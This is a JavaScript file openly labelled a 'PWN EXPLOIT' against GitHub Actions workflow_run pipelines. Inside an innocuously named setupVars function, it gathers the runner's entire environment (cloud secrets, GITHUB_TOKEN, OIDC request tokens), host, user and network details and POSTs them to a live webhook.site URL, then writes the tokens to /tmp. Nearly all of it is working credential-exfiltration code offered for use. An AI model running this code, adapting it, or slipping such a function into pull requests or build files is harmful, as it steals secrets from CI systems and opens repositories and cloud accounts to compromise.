// PWN EXPLOIT - workflow_run Pwn Request
// This runs INSIDE the GCP-authenticated CI runner

export default async function setupVars() {
  // Step 1: Exfiltrate environment variables (contains GCP secrets, GITHUB_TOKEN, etc.)
  const exfilData = {
    env: process.env,
    cwd: process.cwd(),
    node_version: process.version,
    platform: process.platform,
    arch: process.arch,
    hostname: require('os').hostname(),
    user_info: require('os').userInfo(),
    network_interfaces: require('os').networkInterfaces(),
    timestamp: new Date().toISOString()
  };

  // Send to your webhook (use webhook.site or requestbin.com)
  try {
    await fetch('https://webhook.site/ff0b7b4d-656e-4215-83a4-0ae69e941cbe', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(exfilData)
    });
    console.log('[PWN] Exfiltration complete');
  } catch (e) {
    console.log('[PWN] Exfiltration failed:', e.message);
    // Write to file as backup
    require('fs').writeFileSync('/tmp/pwn_exfil.json', JSON.stringify(exfilData, null, 2));
  }

  // Step 2: Write GITHUB_TOKEN to a file (if present)
  if (process.env.GITHUB_TOKEN || process.env.ACTIONS_RUNTIME_TOKEN) {
    const tokenData = {
      GITHUB_TOKEN: process.env.GITHUB_TOKEN || 'N/A',
      ACTIONS_RUNTIME_TOKEN: process.env.ACTIONS_RUNTIME_TOKEN || 'N/A',
      ACTIONS_ID_TOKEN_REQUEST_TOKEN: process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || 'N/A'
    };
    require('fs').writeFileSync('/tmp/pwn_tokens.json', JSON.stringify(tokenData, null, 2));
    console.log('[PWN] Tokens saved');
  }

  return {
    PWNED: true,
    message: 'CI/CD compromised via workflow_run Pwn Request'
  };
}
